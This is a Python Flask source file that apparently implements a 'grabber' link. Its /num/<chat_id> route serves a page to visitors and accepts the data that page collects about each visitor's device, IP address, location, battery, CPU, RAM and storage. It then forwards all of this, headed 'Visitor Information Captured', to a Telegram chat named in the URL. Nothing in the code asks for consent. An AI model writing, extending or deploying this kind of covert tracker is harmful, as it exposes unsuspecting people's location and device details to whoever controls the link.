from flask import Flask, render_template, request, jsonify
import requests
import os
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")

def send_telegram_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text
    }
    requests.post(url, json=payload)


@app.route("/num/<chat_id>", methods=["GET", "POST"])
def handle(chat_id):

    if not chat_id.isdigit():
        return "Invalid Chat ID", 400

    # GET → Render page
    if request.method == "GET":
        return render_template("index.html")

    # POST → Send to Telegram
    data = request.get_json()

    if not data:
        return jsonify({"error": "No data received"}), 400

    message = f"""
📊 Visitor Information Captured
━━━━━━━━━━━━━━━━

🖥  Device & Browser
    • Device Model: {data.get('device_model')}
    • User Agent: {data.get('user_agent')}

🌐 Network Information
   • IP Address: {data.get('ip_address')}
   • Language: {data.get('language')}

📍 Location Details
   • Country: {data.get('country')}
   • Region: {data.get('region')}
   • City: {data.get('city')}
   • Timezone: {data.get('timezone')}

🖼 Display Information
   • Resolution: {data.get('screen_resolution')}   

🔋 Battery Status
   • Level: {data.get('battery_level')}
   • Charging: {data.get('battery_charging')}   

💾 Hardware & Storage
   • CPU Cores: {data.get('cpu_cores')}
   • RAM: {data.get('ram_gb')} GB
   • Storage Used: {data.get('storage_used_gb')}
   • Storage Total: {data.get('storage_total_gb')}

━━━━━━━━━━━━━━━━
"""

    send_telegram_message(chat_id, message)

    return jsonify({"status": "sent"})


@app.route("/get-ip")
def get_ip():
    try:
        response = requests.get("https://ipwho.is/")
        data = response.json()

        if not data.get("success", True):
            return jsonify({"error": "IP lookup failed"}), 400

        return jsonify({
            "ip_address": data.get("ip"),
            "country": data.get("country"),
            "region": data.get("region"),
            "city": data.get("city"),
            "timezone": data.get("timezone", {}).get("id"),
        })

    except Exception as e:
        return jsonify({"error": str(e)}), 500


if __name__ == "__main__":
    app.run(debug=True)